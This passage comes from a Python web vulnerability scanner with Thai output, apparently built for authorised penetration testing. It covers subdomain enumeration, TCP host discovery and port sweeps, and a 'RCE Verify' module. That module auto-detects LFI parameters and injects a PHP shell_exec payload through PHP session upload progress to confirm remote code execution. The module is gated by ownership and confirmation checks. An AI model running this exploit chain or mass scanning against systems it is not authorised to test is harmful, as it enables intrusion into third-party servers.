             list(tls_cves.values()) + list(online_cves.values()) +
             list(oskernel_cves.values()))

    if selected:
        all_r = [r for r in all_r if r.get("cve") in selected
                 or r.get("cve", "").startswith(("UNSUPPORTED-", "APP-", "DEVICE-", "COMP-",
                                                  "EXPOSURE-", "FRAMEWORK-", "HEADER-", "TLS-",
                                                  "ONLINE-", "OS-EOL-", "CONTAINER-", "CVE-2021-3129", "CVE-2024-4577"))]
    vuln_cnt = sum(1 for r in all_r if r["status"] in ("vulnerable", "high-risk", "likely-vulnerable", "unpatched"))
    warn_cnt = sum(1 for r in all_r if r["status"] in ("medium-risk", "vulnerable-version", "vulnerable-conditions"))
    crit = vuln_cnt + warn_cnt
    safe = sum(1 for r in all_r if r["status"] in
                ("patched", "not-exploitable", "n/a", "mitigated"))
    unknown = sum(1 for r in all_r if r["status"] == "unknown")

    if vuln_cnt: _v and print(f"    🔴 พบช่องโหว่ยืนยันแล้ว {vuln_cnt} รายการ" + (f" (+ เตือน {warn_cnt})" if warn_cnt else ""))
    elif warn_cnt: _v and print(f"    🟠 พบสัญญาณเสี่ยง {warn_cnt} รายการ")
    elif unknown: _v and print(f"    ❓ ยังสรุปไม่ได้ {unknown} รายการ")
    else: _v and print(f"    🟢 ไม่พบช่องโหว่ (ตรวจ {len(all_r)} รายการ)")

    return {
        "target": target_str, "reachable": True, "base_url": base, "ip": _resolved_ip,
        "fingerprint": {**fp, "php_versions": sorted(fp["php_versions"])},
        "cms": cms_info, "session": session_info, "nginx_hints": hints,
        "endpoints": {k: {"params": sorted(v["params"]),
                          "methods": sorted(v["methods"])}
                      for k, v in endpoints.items()},
        "preconditions": pc, "lfi_findings": lfi_results,
        "nginx_cves": nginx_cves, "php_cves": php_cves,
        "cve_115560": cve_115560, "nodejs_cves": nodejs_cves,
        "gitlab_cves": gitlab_cves,
        "app_cves": app_cves, "device_cves": device_cves,
        "component_cves": component_cves, "exposure_cves": exposure_cves,
        "framework_cves": framework_cves, "header_cves": header_cves,
        "tls_cves": tls_cves, "online_cves": online_cves,
        "oskernel_cves": oskernel_cves,
        "win_php_cves": win_php_cves, "container_cves": container_cves,
        "summary": {"total_cves": len(all_r), "detected": crit,
                    "vulnerable": vuln_cnt, "warning": warn_cnt,
                    "critical": crit, "safe": safe, "unknown": unknown},
    }


def resolve_cidr(cidr, max_hosts=4096):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError as e:
        print(f"ERROR: {e}"); return []
    hosts = list(net.hosts()) if net.num_addresses > 2 else [net.network_address]
    total = len(hosts)
    print(f"  📊 วง {net.with_prefixlen}: มีทั้งหมด {total:,} ไอพีที่จะสแกน "
          f"(host discovery จะคัดเฉพาะที่มีพอร์ตเว็บเปิดก่อนสแกนเชิงลึก)")
    if total > max_hosts:
        print(f"  ⚠ เกินเพดานความปลอดภัย {max_hosts:,} ไอพี — จะสแกนเฉพาะ {max_hosts:,} ไอพีแรก "
              f"(หากต้องการครบ ให้ระบุช่วง CIDR ที่เล็กลง)")
        hosts = hosts[:max_hosts]
    return [(f"https://{ip}", "cidr") for ip in hosts]


def _subdomain_session():
    """Session สำหรับ subdomain discovery — ใช้ make_session() เพื่อให้ retry/headers ถูกต้อง"""
    s = make_session(no_verify=False)
    return s


def _fetch_crtsh(domain, timeout=40):
    """crt.sh Certificate Transparency — ครอบคลุมที่สุด
    ลอง 3 endpoint: JSON API หลัก, JSON API สำรอง, และ deduplicate mode"""
    subs = set()
    _err = None

    def _parse(text):
        """แยก subdomain จาก JSON ของ crt.sh"""
        found = set()
        try:
            for e in __import__("json").loads(text):
                for name in e.get("name_value", "").splitlines():
                    n = name.strip().lower().lstrip("*.")
                    if n and n.endswith(domain) and "*" not in n:
                        found.add(n)
        except Exception:
            pass
        return found

    endpoints = [
        f"https://crt.sh/?q=%25.{quote(domain)}&output=json",
        f"https://crt.sh/?q=%25.{quote(domain)}&output=json&deduplicate=Y",
        f"https://crt.sh/?dNSName=%25.{quote(domain)}&output=json",
    ]
    s = _subdomain_session()
    for url in endpoints:
        try:
            r = s.get(url, timeout=(10, timeout))
            if r.status_code == 200 and r.text.strip() and r.text.strip() != "[]":
                found = _parse(r.text)
                if found:
                    subs |= found
                    _err = None
                    break   # สำเร็จแล้ว ไม่ต้องลอง endpoint ถัดไป
            elif r.status_code != 200:
                _err = f"HTTP {r.status_code}"
        except Exception as e:
            err_str = str(e)
            if "timed out" in err_str.lower() or "timeout" in err_str.lower():
                _err = "timeout"
            elif "proxy" in err_str.lower() or "403" in err_str:
                _err = "proxy/firewall block"
            elif "connection" in err_str.lower():
                _err = "connection refused"
            else:
                _err = err_str[:60]
            # ลอง endpoint ถัดไป (ไม่ break)

    return subs, _err   # (set_of_subdomains, error_string_or_None)


def _fetch_hackertarget(domain, timeout=10):
    """HackerTarget hostsearch — ฟรี ไม่ต้อง key ตอบเร็ว"""
    subs = set()
    try:
        s = _subdomain_session()
        r = s.get(f"https://api.hackertarget.com/hostsearch/?q={quote(domain)}",
                  timeout=(5, timeout))
        if r.status_code == 200 and r.text.strip() and "error" not in r.text[:60].lower():
            for line in r.text.splitlines():
                parts = line.split(",")
                if parts:
                    n = parts[0].strip().lower()
                    if n and n.endswith(domain) and "*" not in n:
                        subs.add(n)
    except Exception:
        pass
    return subs


def _fetch_alienvault(domain, timeout=10):
    """AlienVault OTX passive DNS — ฟรี ไม่ต้อง key"""
    subs = set()
    try:
        s = _subdomain_session()
        url = f"https://otx.alienvault.com/api/v1/indicators/domain/{quote(domain)}/passive_dns"
        r = s.get(url, timeout=(5, timeout))
        if r.status_code == 200:
            for rec in r.json().get("passive_dns", []):
                h = rec.get("hostname", "").strip().lower()
                if h and h.endswith(domain) and "*" not in h:
                    subs.add(h)
    except Exception:
        pass
    return subs


def _fetch_anubis(domain, timeout=8):
    """Anubis (jldc.me) — ฟรี ไม่ต้อง key ตอบเร็ว JSON"""
    subs = set()
    try:
        s = _subdomain_session()
        r = s.get(f"https://jldc.me/anubis/subdomains/{quote(domain)}",
                  timeout=(5, timeout))
        if r.status_code == 200:
            for n in r.json():
                n = n.strip().lower()
                if n and n.endswith(domain) and "*" not in n:
                    subs.add(n)
    except Exception:
        pass
    return subs


def _fetch_rapiddns(domain, timeout=10):
    """RapidDNS — ฟรี ไม่ต้อง key รองรับโดเมนไทย"""
    subs = set()
    try:
        s = _subdomain_session()
        r = s.get(f"https://rapiddns.io/subdomain/{quote(domain)}?full=1",
                  timeout=(5, timeout))
        if r.status_code == 200:
            import re as _re
            for n in _re.findall(r'<td>([a-z0-9._-]+\.' + _re.escape(domain) + r')</td>',
                                 r.text, _re.I):
                n = n.strip().lower()
                if "*" not in n:
                    subs.add(n)
    except Exception:
        pass
    return subs


def _fetch_c99(domain, api_key, timeout=12):
    """c99.nl SubdomainFinder API — ต้อง API key (ครอบคลุมมาก)"""
    subs = set()
    try:
        s = _subdomain_session()
        r = s.get(f"https://api.c99.nl/subdomainfinder?key={api_key}&domain={quote(domain)}&json",
                  timeout=(5, timeout))
        if r.status_code == 200:
            data = r.json()
            for item in data.get("subdomains", []):
                n = (item.get("subdomain") or "").strip().lower()
                if n and n.endswith(domain) and "*" not in n:
                    subs.add(n)
    except Exception:
        pass
    return subs


def resolve_wildcard(domain, bruteforce=False, wordlist=None, st_key=None,
                      c99_key=None, max_subs=2000):
    domain = domain.strip().lower().rstrip(".")
    subs = set()

    # ── Phase 1: ค้นหาจาก 5 แหล่งฟรีพร้อมกัน (parallel) ───────────────────
    print("  [Subdomain Discovery] ค้นหาจาก 5 แหล่งพร้อมกัน (parallel)...")
    with ThreadPoolExecutor(max_workers=5) as ex:
        fut_crt    = ex.submit(_fetch_crtsh,       domain)
        fut_ht     = ex.submit(_fetch_hackertarget, domain)
        fut_otx    = ex.submit(_fetch_alienvault,   domain)
        fut_anubis = ex.submit(_fetch_anubis,       domain)
        fut_rdns   = ex.submit(_fetch_rapiddns,     domain)

        _crt_subs, _crt_err = fut_crt.result()
        results_map = {
            "crt.sh (CT)":     (_crt_subs, _crt_err),
            "HackerTarget":    (fut_ht.result(),     None),
            "AlienVault OTX":  (fut_otx.result(),    None),
            "Anubis (jldc)":   (fut_anubis.result(), None),
            "RapidDNS":        (fut_rdns.result(),   None),
        }

    for src, (res, err) in results_map.items():
        mark = "✓" if res else "–"
        subs |= res
        err_hint = ""
        if not res and err:
            err_hint = f"  ⚠ {err}"
        elif not res and src == "crt.sh (CT)":
            err_hint = "  (ไม่พบข้อมูล หรือ server ยุ่ง)"
        print(f"    [{mark}] {src:<20}: {len(res):>4} subdomains{err_hint}")
    print(f"    → รวม (deduplicated): {len(subs)} subdomains")

    # ── Phase 2: แหล่งที่ต้องใช้ API key (optional) ─────────────────────────
    if c99_key:
        print("  [c99.nl] SubdomainFinder API ...")
        res_c99 = _fetch_c99(domain, c99_key)
        before = len(subs); subs |= res_c99
        mark = "✓" if res_c99 else "–"
        print(f"    [{mark}] c99.nl: {len(res_c99)} subdomains (+{len(subs)-before} ใหม่)")

    if st_key:
        print("  [SecurityTrails] ...")
        try:
            s = _subdomain_session()
            r = s.get(f"https://api.securitytrails.com/v1/domain/{domain}/subdomains",
                      timeout=20, headers={"APIKEY": st_key})
            if r.status_code == 200:
                before = len(subs)
                for sub in r.json().get("subdomains", []):
                    subs.add(f"{sub}.{domain}".lower())
                print(f"    [✓] SecurityTrails: +{len(subs)-before} ใหม่")
        except Exception as e:
            print(f"    ⚠ SecurityTrails: {e}")

    if bruteforce and wordlist and HAS_DNS:
        print(f"  [bruteforce] ...")
        try:
            words = [l.strip() for l in open(wordlist) if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            words = []
        if words:
            before = len(subs)
            lock = Lock()
            def try_dns(w):
                try:
                    dns.resolver.resolve(f"{w}.{domain}", "A", lifetime=3)
                    with lock: subs.add(f"{w}.{domain}".lower())
                except: pass
            with ThreadPoolExecutor(max_workers=50) as ex:
                list(ex.map(try_dns, words))
            print(f"    → +{len(subs)-before}")

    subs.add(domain)
    if len(subs) > max_subs:
        subs = set(sorted(subs)[:max_subs])
        print(f"  ⚠ จำกัด {max_subs}")
    return [(f"https://{s}", "wildcard") for s in sorted(subs)]


def _hlabel(t):
    return t.replace("https://", "").replace("http://", "").rstrip("/")[:40]


# พอร์ตเว็บ/อุปกรณ์ที่ใช้ "เคาะ" หาโฮสต์ที่ตอบสนอง (TCP connect — ไม่พึ่ง ICMP จึงใช้ได้แม้ปิดปิง)
# พอร์ตเช็ก "โฮสต์ตอบสนองไหม" (เร็ว — เจอพอร์ตแรกก็พอ)
_LIVENESS_PORTS = [80, 443, 8080, 8443, 22]
# พอร์ตเว็บ/แอดมิน/อุปกรณ์ ที่จะ "ไล่หาให้ครบ" บนโฮสต์ที่ตอบสนอง แล้วสแกนทุกพอร์ตที่เปิด (แก้ปัญหา 'ใช้พอร์ตอื่นจะไม่เจอ')
_WEB_PORTS = [80, 443, 8080, 8443, 8000, 8008, 8888, 10000, 2082, 2083, 2086, 2087, 2095, 2096,
              8083, 8090, 2222,
              2375, 2376, 6443, 5000]  # + Container/API ports (Docker 2375/2376, K8s 6443, Registry 5000)
_WEB_PORTS_LAN = _WEB_PORTS + [81, 82, 88, 591, 7001, 7080, 8081, 8082, 8088, 8181, 8800,
                               9000, 9080, 9090, 9091, 9443, 10443, 4443, 5000, 5001, 3000,
                               5601, 7474, 8834, 9200, 61208,
                               # control panel โอเพนซอร์ส: aaPanel/BT · Webuzo · CWP
                               7800, 888, 2002, 2004, 2030, 2031]


def _host_liveness(target, ports, timeout):
    """ตรวจว่าโฮสต์ตอบสนอง (เจอพอร์ตเปิดพอร์ตแรกก็พอ) — คืน (ip|None, alive)"""
    import socket
    h = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    try:
        ip = socket.gethostbyname(h)
    except Exception:
        return None, False
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((ip, p)) == 0:
                return ip, True
        except Exception:
            pass
        finally:
            s.close()
    return ip, False


def _port_target(base_target, ip_or_host, port):
    """สร้าง URL เป้าหมายต่อพอร์ต — 80→http, 443→https, อื่นๆ→https (สแกนมี fallback http ในตัว)"""
    host = base_target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    if port == 80:
        return f"http://{host}"
    if port == 443:
        return f"https://{host}"
    return f"https://{host}:{port}"


def _discover_alive(targets, opts):
    """Host discovery 2 เฟส:
      เฟส 1 — ค้นหาโฮสต์ที่ตอบสนอง (เจอพอร์ตเว็บเปิดพอร์ตแรกก็พอ) ข้ามไอพีตายเร็ว ไม่รอ HTTP timeout 8s
      เฟส 2 — บนโฮสต์ที่ตอบสนอง 'ไล่หาพอร์ตเว็บให้ครบ' แล้วสแกนทุกพอร์ตที่เปิด (เจอเว็บบนพอร์ตแปลก ๆ ด้วย)
    ใช้ TCP connect ล้วน (ไม่พึ่ง ICMP → ปิดปิงก็ใช้ได้)
    คืน (scan_targets, dead_results); dead บันทึกเป็น 'เข้าไม่ถึง' เพื่อให้ยอดรวมในรายงานตรง"""
    lan = opts.get("scan_mode") == "lan"
    enum_ports = _WEB_PORTS_LAN if lan else _WEB_PORTS
    dt = 0.6 if lan else 1.0
    total = len(targets)
    workers = min(128, max(8, total))
    print(f"  🔎 Host discovery (TCP · ไม่พึ่งปิง) บน {total} เป้าหมาย ด้วย {workers} threads · "
          f"timeout {dt}s/พอร์ต — เฟส 1: ค้นหาโฮสต์ที่ตอบสนอง …")
    alive_ips, dead = [], []
    done = {"n": 0}
    dlock = Lock()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_host_liveness, t[0], _LIVENESS_PORTS, dt): t for t in targets}
        for f in as_completed(futs):
            t = futs[f]
            try:
                ip, ok = f.result()
            except Exception:
                ip, ok = None, False
            if ok:
                alive_ips.append((t, ip))
            else:
                dead.append({"target": t[0], "reachable": False,
                             "skipped_discovery": True, "_elapsed": 0,
                             "error": "ไม่พบพอร์ตเว็บเปิด (ข้ามจาก host discovery)"})
            with dlock:
                done["n"] += 1
                sys.stdout.write(f"\r\033[K  🔎 เฟส 1: ตรวจแล้ว {done['n']}/{total} · พบโฮสต์ {len(alive_ips)}")
                sys.stdout.flush()
    # เฟส 2 — ไล่พอร์ตเว็บให้ครบ: ยิง (โฮสต์ × พอร์ต) เป็น task แบนขนานกันทั้งหมด → เร็วสุด
    print(f"\r\033[K  🔎 เฟส 2: ไล่พอร์ตเว็บให้ครบบน {len(alive_ips)} โฮสต์ที่พบ "
          f"({len(enum_ports)} พอร์ต/โฮสต์) …")
    import socket as _sock
    open_map = {ip: set() for (_t, ip) in alive_ips}

    def _probe1(ip, port):
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(dt)
        try:
            return ip, port, (s.connect_ex((ip, port)) == 0)
        except Exception:
            return ip, port, False
        finally:
            s.close()

    tasks = [(ip, p) for (_t, ip) in alive_ips for p in enum_ports]
    if tasks:
        with ThreadPoolExecutor(max_workers=min(256, len(tasks))) as ex:
            for f in as_completed([ex.submit(_probe1, ip, p) for (ip, p) in tasks]):
                ip, port, ok = f.result()
                if ok:
                    open_map[ip].add(port)
    scan_targets, svc_count = [], 0
    for (t, ip) in alive_ips:
        ports = sorted(open_map.get(ip) or {443})  # โฮสต์ตอบสนองแต่ไล่พอร์ตไม่เจอ → สแกน https ปกติ
        seen = set()
        for p in ports:
            url = _port_target(t[0], ip, p)
            if url not in seen:
                seen.add(url)
                scan_targets.append((url, t[1]))
                svc_count += 1
    print(f"  ✅ Host discovery เสร็จ: พบโฮสต์ที่ตอบสนอง {len(alive_ips)}/{total} · "
          f"พบ {svc_count} web service (รวมพอร์ตนอกมาตรฐาน) · ข้าม {len(dead)} ไอพีที่ไม่มีเว็บ "
          f"→ สแกนเชิงลึก {svc_count} รายการ")
    return scan_targets, dead


def run_scan(targets, opts):
    results = []
    total = len(targets)
    if total == 1:
        return [scan_single_target(targets[0][0], opts, 1, 1)]
    # ── Host discovery ก่อน (เปิดเป็นค่าเริ่มต้นสำหรับ CIDR/หลายโฮสต์) — ข้ามไอพีตายอย่างรวดเร็ว ──
    discovery_dead = []
    if opts.get("discover") and total > 1:
        targets, discovery_dead = _discover_alive(targets, opts)
        total = len(targets)
        if total == 0:
            print("  ⚠ ไม่พบโฮสต์ที่มีพอร์ตเว็บเปิดเลย — ไม่มีอะไรให้สแกนเชิงลึก")
            return discovery_dead
    state = {"done": 0, "reachable": 0, "crit": 0, "stop": False}
    inflight = {}            # label -> เวลาเริ่ม (ใช้บอกว่าโฮสต์ไหนกำลังค้าง)
    ilock = Lock()
    draw_lock = Lock()
    start = time.time()
    verbose = opts.get("verbose")

    def _snapshot():
        with ilock:
            return sorted(inflight.items(), key=lambda kv: kv[1])

    def _bar_str():
        el = time.time() - start
        done = state["done"]
        pct = done * 100 // total
        rate = done / el if el > 0 else 0
        eta = int((total - done) / rate) if rate > 0 else 0
        blen = 16
        fill = int(blen * done / total)
        bar = "\u2588" * fill + "\u2591" * (blen - fill)
        cols = max(60, shutil.get_terminal_size((100, 20)).columns - 4)
        line = (f"  [{bar}] {pct:3d}% {done}/{total} | สแกนอยู่ {len(inflight)} "
                f"| เข้าถึงได้ {state['reachable']} | พบความเสี่ยง {state['crit']} "
                f"| ผ่านมา {int(el)}s ~{eta}s")
        return line[:cols]

    def _bar():
        with draw_lock:
            sys.stdout.write("\r\033[K" + _bar_str())
            sys.stdout.flush()

    def _vline():
        el = time.time() - start
        done = state["done"]
        busy = _snapshot()
        names = ", ".join(f"{k}({int(time.time()-v)}s)" for k, v in busy[:3])
        extra = f" · กำลังตรวจ: {names}" if names else ""
        print(f"  \u23f3 ทำเสร็จ {done}/{total} ({done*100//total}%) · กำลังสแกน {len(busy)} โฮสต์ "
              f"· ผ่านมา {int(el)}s{extra}")

    def _ticker():
        while not state["stop"]:
            if verbose:
                _vline()
                time.sleep(5)
            else:
                _bar()
                time.sleep(1)

    host_budget = opts.get("host_budget", 60)   # เพดานเวลารวมต่อโฮสต์ (วินาที) — เกินแล้วข้าม

    def _scan_one(t, i):
        lab = _hlabel(t)
        t0 = time.time()
        with ilock:
            inflight[lab] = t0
        box = {"r": None}

        def _work():
            try:
                box["r"] = scan_single_target(t, opts, i, total)
            except Exception as e:
                box["r"] = {"target": t, "reachable": False, "error": str(e)}
        try:
            wth = Thread(target=_work, daemon=True)
            wth.start()
            wth.join(timeout=host_budget)   # hard timeout: ถ้าโฮสต์ค้างเกินงบเวลา จะข้ามทันที
            if box["r"] is None:
                res = {"target": t, "reachable": False, "timed_out": True,
                       "error": f"หมดเวลาต่อโฮสต์ (เกิน {host_budget}s) — ข้าม"}
            else:
                res = box["r"]
            res["_elapsed"] = int(round(time.time() - t0))
            return res
        finally:
            with ilock:
                inflight.pop(lab, None)

    print(f"  เริ่มสแกน {total} เป้าหมาย (threads={opts.get('target_threads', 3)}) — "
          f"แสดงผลโฮสต์ละ 1 บรรทัดเมื่อสแกนเสร็จ")
    if not verbose:
        _bar()
    ticker = Thread(target=_ticker, daemon=True)
    ticker.start()
    w_pad = len(str(total))
    try:
        with ThreadPoolExecutor(max_workers=opts.get("target_threads", 3)) as ex:
            futs = {ex.submit(_scan_one, t, i): t for i, (t, _) in enumerate(targets, 1)}
            for f in as_completed(futs):
                try:
                    r = f.result()
                except Exception as e:
                    r = {"target": futs[f], "reachable": False, "error": str(e), "_elapsed": 0}
                results.append(r)
                state["done"] += 1
                if r.get("reachable"):
                    state["reachable"] += 1
                    state["crit"] += r.get("summary", {}).get("critical", 0)
                if not verbose:
                    lab = _hlabel(r.get("target", futs[f]))
                    el_h = r.get("_elapsed", 0)
                    if not r.get("reachable"):
                        status_txt = "\u274c เข้าไม่ถึง" + (" (หมดเวลา)" if r.get("timed_out") else "")
                    else:
                        sm = r.get("summary", {})
                        v_c = sm.get("vulnerable", 0)
                        w_c = sm.get("warning", 0)
                        u_c = sm.get("unknown", 0)
                        srv = r.get("fingerprint", {}).get("server_family", "?")
                        if v_c > 0:
                            status_txt = f"\U0001f534 พบช่องโหว่ยืนยัน {v_c} รายการ" + (f" (+เตือน {w_c})" if w_c else "") + f" [{srv}]"
                        elif w_c > 0:
                            status_txt = f"\U0001f7e0 พบสัญญาณเสี่ยง {w_c} รายการ [{srv}]"
                        elif u_c > 0:
                            status_txt = f"\u2753 ยังสรุปไม่ได้ {u_c} รายการ [{srv}]"
                        else:
                            status_txt = f"\U0001f7e2 ปลอดภัย [{srv}]"
                    with draw_lock:
                        sys.stdout.write(
                            f"\r\033[K  [{state['done']:>{w_pad}}/{total}] {lab:<34} \u2192 {status_txt} ({el_h}s)\n"
                            + _bar_str()
                        )
                        sys.stdout.flush()
    finally:
        state["stop"] = True
        ticker.join(timeout=2.5)
    if not verbose:
        with draw_lock:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()
    print(f"  \u2705 สแกนเสร็จ {total} เป้าหมาย ใน {int(time.time()-start)}s "
          f"(เข้าถึงได้ {state['reachable']}, พบความเสี่ยง {state['crit']})")
    # รวมไอพีที่ host discovery คัดออก (ไม่มีพอร์ตเว็บ) กลับเข้าผลลัพธ์ เพื่อให้ยอดรวมในรายงานตรงกับจำนวนที่ระบุ
    results.extend(discovery_dead)
    return results


# ═══════════════════════════════════════════════════════════════════════
# SECTION 4 — RCE Verify
# ═══════════════════════════════════════════════════════════════════════

class EvidenceLogger:
    def __init__(self, evidence_dir, target, operator):
        self.dir = Path(evidence_dir)
        self.dir.mkdir(parents=True, exist_ok=True)
        self.target, self.operator = target, operator
        self.session_id = uuid.uuid4().hex[:12]
        self.entries = []
        self.transcript = self.dir / "transcript.log"
        self.metadata = self.dir / "metadata.json"
        self._w("=== Chain of Custody ===")
        self._w(f"Session ID : {self.session_id}")
        self._w(f"Target     : {target}")
        self._w(f"Operator   : {operator}")
        self._w(f"Started    : {datetime.now(timezone.utc).isoformat()}")
        self._w("=" * 60 + "\n")

    def _w(self, line):
        with open(self.transcript, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def log(self, stage, msg):
        ts = datetime.now(timezone.utc).isoformat()
        self._w(f"[{ts}] [{stage}] {msg}")
        self.entries.append({"ts": ts, "stage": stage, "msg": msg})
        print(f"    {msg}")

    def save(self, name, content):
        p = self.dir / name
        p.write_text(content, encoding="utf-8")
        sha = hashlib.sha256(content.encode()).hexdigest()
        self._w(f"    [EVIDENCE] {name} sha256={sha[:16]}...")

    def finalize(self, verdict, rce_output=None):
        meta = {"session_id": self.session_id, "target": self.target,
                "operator": self.operator,
                "started": self.entries[0]["ts"] if self.entries else None,
                "finished": datetime.now(timezone.utc).isoformat(),
                "verdict": verdict, "rce_output": rce_output,
                "command": " ".join(sys.argv)}
        self.metadata.write_text(json.dumps(meta, indent=2, ensure_ascii=False),
                                   encoding="utf-8")
        self._w(f"\n=== VERDICT: {verdict} ===")
        return meta


def _autodetect_lfi(session, target, timeout, logger):
    logger.log("LFI-SCAN", "Auto-detect LFI ...")
    origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    visited, queue = set(), [target]
    candidates = {}
    try:
        r = session.get(origin + "/rmutcert-nonexist-" + uuid.uuid4().hex[:6], timeout=timeout)
        baseline_text = r.text
    except: baseline_text = None

    while queue and len(visited) < 30:
        url = queue.pop(0)
        if url in visited: continue
        p = urlparse(url)
        if f"{p.scheme}://{p.netloc}" != origin: continue
        visited.add(url)
        try:
            r = session.get(url, timeout=timeout, allow_redirects=True)
            if r.status_code >= 400: continue
            if p.query and not is_static(p.path):
                params = parse_qs(p.query).keys()
                if params: candidates.setdefault(p.path, set()).update(params)
            for m in re.finditer(r'href=["\']([^"\']+)["\']', r.text):
                link = urljoin(url, m.group(1)).split("#")[0]
                if link.startswith(origin) and link not in visited: queue.append(link)
        except requests.RequestException:
            continue

    for path, params in sorted(candidates.items(),
                                 key=lambda x: (-len(x[1] & {"page","file","view","include","path"}), x[0]))[:20]:
        for param in sorted(params):
            for payload, ptype, markers in LFI_PAYLOADS[:3]:
                try:
                    r = session.get(f"{origin}{path}?{param}={payload}", timeout=timeout)
                    if r.status_code >= 500: continue
                    if baseline_text and r.text == baseline_text: continue
                    if markers and any(m in r.text for m in markers):
                        lfi_url = f"{origin}{path}?{param}=FUZZ"
                        logger.log("LFI-SCAN", f"✅ {lfi_url}")
                        return lfi_url
                except requests.RequestException:
                    continue
    logger.log("LFI-SCAN", "❌ ไม่พบ")
    return None


def _autodetect_session(session, target, lfi_url, timeout, logger):
    origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    cands = ["/login.php", "/api/app.php", "/cart.php", "/", "/vuln.php"]
    if lfi_url:
        lp = urlparse(lfi_url).path
        if lp and lp not in cands: cands.insert(0, lp)
    for c in cands:
        try:
            r = session.get(origin + c, timeout=timeout, allow_redirects=True)
            if "PHPSESSID" in r.headers.get("Set-Cookie", ""):
                logger.log("SESSION", f"✅ {c}")
                return origin + c
        except requests.RequestException:
            continue
    logger.log("SESSION", "⚠ ใช้ homepage")
    return origin + "/"


def _inject(session, session_endpoint, logger, timeout):
    sid = "rmutcert" + uuid.uuid4().hex[:12]
    payload = "<?php echo 'RMUTCERT_RCE_PROOF::' . php_uname() . '::' . shell_exec('id') . '::END'; ?>"
    logger.log("INJECT", f"SID: {sid}, payload: {len(payload)}b")
    data = {"PHP_SESSION_UPLOAD_PROGRESS": f"x|{sid}", "PHPSESSID": sid}
    try:
        r = session.post(session_endpoint, data=data,
                          files={"f": (payload, b"benign", "text/plain")},
                          timeout=timeout, allow_redirects=False)
        logger.log("INJECT", f"HTTP {r.status_code}")
        return sid
    except requests.RequestException as e:
        logger.log("INJECT", f"❌ {e}")
        return None


def _trigger(session, lfi_url, sid, logger, timeout):
    for tmpl in SESSION_PATHS:
        path = tmpl.replace("{sid}", sid)
        url = lfi_url.replace("FUZZ", path)
        try:
            r = session.get(url, timeout=timeout)
            if "RMUTCERT_RCE_PROOF::" in r.text:
                m = re.search(r"RMUTCERT_RCE_PROOF::(.*?)::END", r.text, re.DOTALL)
                if m:
                    out = m.group(1).strip()
                    logger.log("TRIGGER", f"✅ RCE CONFIRMED: {path}")
                    logger.save("rce_proof.txt", f"URL: {url}\n\nOutput:\n{out}\n")
                    logger.save("rce_response.html", r.text[:50000])
                    return {"success": True, "output": out, "path": path, "url": url}
        except requests.RequestException:
            pass
    logger.log("TRIGGER", "❌ ไม่พบ marker")
    return {"success": False}


def _canary(session, session_endpoint, lfi_url, logger, timeout):
    logger.log("CANARY", "Fallback canary ...")
    sid = "canary" + uuid.uuid4().hex[:12]
    canary = "RMUTCERT_CANARY_" + uuid.uuid4().hex[:16]
    try:
        session.post(session_endpoint,
                      data={"PHP_SESSION_UPLOAD_PROGRESS": f"x|{sid}",
                            "PHPSESSID": sid},
                      files={"f": (canary, b"benign", "text/plain")},
                      timeout=timeout, allow_redirects=False)
    except requests.RequestException:
        return {"success": False}
    for tmpl in SESSION_PATHS:
        url = lfi_url.replace("FUZZ", tmpl.replace("{sid}", sid))
        try:
            r = session.get(url, timeout=timeout)
            if canary in r.text:
                logger.log("CANARY", "✅ readback")
                logger.save("canary_proof.txt", f"URL: {url}\nCanary: {canary}\n")
                return {"success": True, "canary": canary, "path": tmpl}
        except requests.RequestException:
            continue
    return {"success": False}


def run_rce_verify(target, lfi_url=None, session_endpoint=None,
                    evidence_dir=None, timeout=10, no_verify_ssl=False,
                    operator=None, confirm=True, i_own_this_target=False):
    """คืน (verdict, summary, evidence_dir)"""
    host = urlparse(target).hostname or ""
    operator = operator or os.environ.get("USER", "unknown")

    if not is_private_host(target):
        if i_own_this_target:
            print(f"  ⚠  {host} เป็น public IP — ดำเนินการต่อเพราะมี --i-own-this-target")
        else:
            print(f"  ❌ {host} ไม่ใช่ private IP")
            return "REJECTED", None, None

    if confirm:
        print()
        print(f"  ⚠ กำลังจะรัน RCE บน {host}")
        print(f"     พิมพ์ 'YES' เพื่อยืนยัน: ", end="", flush=True)
        try:
            if input().strip().upper() != "YES":
                print("  ❌ ยกเลิก")
                return "CANCELLED", None, None
        except EOFError:
            return "CANCELLED", None, None

    if not evidence_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        evidence_dir = f"evidence/{safe_name(host)}_{ts}"

    logger = EvidenceLogger(evidence_dir, target, operator)
    session = make_session(no_verify_ssl)

    try:
        r = session.get(target, timeout=timeout)
        logger.log("PRECHECK", f"HTTP {r.status_code}")
        if r.status_code >= 500:
            logger.finalize("UNREACHABLE")
            return "UNREACHABLE", None, evidence_dir
    except requests.RequestException as e:
        logger.log("PRECHECK", f"❌ {e}")
        logger.finalize("UNREACHABLE")
        return "UNREACHABLE", None, evidence_dir

    if not lfi_url:
        lfi_url = _autodetect_lfi(session, target, timeout, logger)
        if not lfi_url:
            logger.finalize("NO_LFI")
            return "NO_LFI", None, evidence_dir

    if not session_endpoint:
        session_endpoint = _autodetect_session(session, target, lfi_url,
                                                 timeout, logger)

    sid = _inject(session, session_endpoint, logger, timeout)
    if not sid:
        logger.finalize("INJECT_FAILED")
        return "INJECT_FAILED", None, evidence_dir

    time.sleep(1)
    result = _trigger(session, lfi_url, sid, logger, timeout)

    canary = None
    if not result.get("success"):
        canary = _canary(session, session_endpoint, lfi_url, logger, timeout)

    if result.get("success"):
        verdict = "RCE_CONFIRMED"
        summary = {"verdict": "RCE_CONFIRMED", "proof_type": "full_rce",
                   "output": result["output"], "trigger_url": result["url"]}
        print()
        print("  🎯 RCE CONFIRMED")
        for line in result["output"].split("::"):
            if line.strip(): print(f"    → {line.strip()}")
    elif canary and canary.get("success"):
        verdict = "CANARY_CONFIRMED"
